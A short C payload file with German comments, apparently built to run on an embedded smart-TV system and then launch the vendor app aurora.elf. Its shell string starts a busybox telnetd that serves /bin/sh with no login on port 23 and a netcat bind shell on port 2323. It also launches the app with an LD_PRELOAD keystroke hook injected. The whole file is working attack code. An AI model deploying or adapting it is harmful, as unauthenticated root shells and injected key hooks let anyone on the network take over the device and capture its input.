/* Payload v5: wie v4, plus optionaler Tasten-Hook NUR fuer die echte App.
 *
 * Die Shells (telnetd/nc) werden VOR dem LD_PRELOAD gestartet, damit sie den
 * Hook nicht erben. Der Hook gilt ausschliesslich fuer aurora.elf.
 */
#include <unistd.h>
int main(void) {
    char *cmd =
        "mkdir -p /dev/pts; "
        "mount -t devpts devpts /dev/pts 2>/dev/null; "
        "export PATH=/conf/remotelf:/buffer:$PATH; "
        "export TERMINFO=/conf/remotelf/terminfo; "
        "export TERM=xterm; "
        "(setsid busybox telnetd -l /bin/sh -p 23 >/dev/null 2>&1 &); "
        "(busybox nc -ll -p 2323 -e /bin/sh >/dev/null 2>&1 &); "
        "if [ -f /conf/remotelf/libkeyhook.so ]; then "
        "  cp -f /conf/remotelf/libkeyhook.so /tmp/ && "
        "  exec env LD_PRELOAD=/tmp/libkeyhook.so /vendor/com.nvt.idtv/aurora.elf; "
        "fi; "
        "exec /vendor/com.nvt.idtv/aurora.elf";
    execl("/bin/sh", "sh", "-c", cmd, (char *)0);
    return 0;
}
